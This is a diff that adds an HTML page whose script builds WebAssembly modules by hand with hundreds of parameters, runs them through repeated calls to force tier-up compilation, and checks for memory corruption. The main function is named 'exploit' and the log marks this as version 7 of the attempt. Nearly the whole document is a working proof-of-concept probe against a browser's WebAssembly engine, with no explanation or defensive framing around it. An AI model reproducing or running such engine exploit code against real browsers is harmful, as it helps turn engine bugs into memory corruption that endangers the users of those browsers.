@@ -1,0 +1,57 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>LOADING</title></head>
+<body><h3>WASM v7</h3>
+<pre id="log" style="font-size:11px;background:#111;color:#0f0;padding:8px;max-height:600px;overflow:auto;white-space:pre-wrap;"></pre>
+<script>
+function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}
+function leb(v){let r=[];do{let b=v&0x7f;v>>=7;if(v)b|=0x80;r.push(b)}while(v);return r}
+function buildWasm(pc){
+  let b=[0,0x61,0x73,0x6d,1,0,0,0];
+  // Type section
+  let ts=[...leb(1),0x60,...leb(pc)];
+  for(let i=0;i<pc;i++)ts.push(0x7f);
+  ts.push(...leb(1),0x7f);
+  b.push(1,...leb(ts.length),...ts);
+  // Func section
+  let fs=[...leb(1),0];
+  b.push(3,...leb(fs.length),...fs);
+  // Export section
+  let es=[...leb(1),1,0x66,0,0];
+  b.push(7,...leb(es.length),...es);
+  // Code section - FIXED: no double size encoding
+  let funcBody=[0,0x41,0x2a,0x0b]; // 0 locals, i32.const 42, end
+  let codeEntry=[...leb(funcBody.length),...funcBody]; // size + body
+  let codeSec=[...leb(1),...codeEntry]; // count + entries
+  b.push(0x0a,...leb(codeSec.length),...codeSec);
+  return new Uint8Array(b);
+}
+function exploit(){
+  log('[*] WASM v7 (fixed encoder)');
+  for(let pc of [3,10,100,500,900,999,1000,1001]){
+    try{
+      let m=new WebAssembly.Module(buildWasm(pc));
+      let i=new WebAssembly.Instance(m);
+      let a=new Array(Math.min(pc,20)).fill(42);
+      let r=i.exports.f.apply(null,a);
+      log('[+] '+pc+' params: COMPILED OK, call r='+r);
+    }catch(e){
+      log('[!] '+pc+': '+e.message.substring(0,120));
+    }
+  }
+  // Tier-up with 999 params
+  log('[*] 999 params x 10000 calls...');
+  try{
+    let m=new WebAssembly.Module(buildWasm(999));
+    let i=new WebAssembly.Instance(m);
+    let a=new Array(999).fill(0);
+    let t0=Date.now();
+    for(let j=0;j<10000;j++) i.exports.f.apply(null,a);
+    log('[+] 10k calls: '+(Date.now()-t0)+'ms');
+    let s=new Float64Array(64);s.fill(1.1);
+    let bad=false;
+    for(let j=0;j<64;j++)if(s[j]!==1.1){log('[+] CORRUPT s['+j+']='+s[j]);bad=true;}
+    if(!bad) log('[*] No corruption (999 within safe limit)');
+  }catch(e){log('[!] '+e.message.substring(0,120));}
+  log('[*] Done.');
+}
+setTimeout(exploit,500);
+</script></body></html>
